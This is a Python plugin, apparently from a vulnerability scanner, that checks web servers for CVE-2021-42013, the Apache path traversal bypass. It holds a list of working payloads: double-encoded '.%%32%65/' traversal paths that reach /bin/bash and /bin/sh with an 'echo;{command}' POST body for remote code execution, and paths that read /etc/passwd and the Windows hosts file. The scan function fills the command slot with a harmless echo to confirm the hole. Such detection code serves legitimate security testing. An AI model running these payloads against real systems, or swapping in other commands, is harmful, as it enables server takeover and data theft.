#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_md5
from lib.tool import check

cve_2021_42013_payloads = [
    {
        'path': 'cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash',
        'data': 'echo;{RCECOMMAND}'
    },
    {
        'path': '.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash',
        'data': 'echo;{RCECOMMAND}'
    },
    {
        'path': 'cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh',
        'data': 'echo;{RCECOMMAND}'
    },
    {
        'path': '.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh',
        'data': 'echo;{RCECOMMAND}'
    },
    # * 无法RCE, 只能FileRead
    {
        'path': 'icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd',
        'data': ''
    },
    {
        'path': '.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd',
        'data': ''
    },
    {
        'path': 'icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/C:/Windows/System32/drivers/etc/hosts',
        'data': ''
    },
    {
        'path': '.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/C:/Windows/System32/drivers/etc/hosts',
        'data': ''
    }
]

def cve_2021_42013_scan(self, clients):
    ''' CVE-2021-42013是CVE-2021-41773的绕过, 使用.%%32%65/ '''
    hackClient = clients.get('hackClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'RCE/FileRead',
        'vul_id': 'CVE-2021-42013',
    }

    for payload in cve_2021_42013_payloads:
        path = payload['path']
        data = payload['data']
        random_str = random_md5(6)                  # * 随机6位字符串

        if data:                                    # * 有POST数据则RCE, 否则为FileRead
            RCEcommand = 'echo ' + random_str
            data = data.format(RCECOMMAND=RCEcommand)
            
            res = hackClient.request(
                'get',
                path,
                data=data,
                vul_info=vul_info
            )
        else:
            res = hackClient.request(
                'get',
                path,
                vul_info=vul_info
            )
        if res is None:
            continue

        if (
            (check.check_res(res.text, random_str))
            or (check.check_res_fileread(res.text))
        ):
            results = {
                'Target': res.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
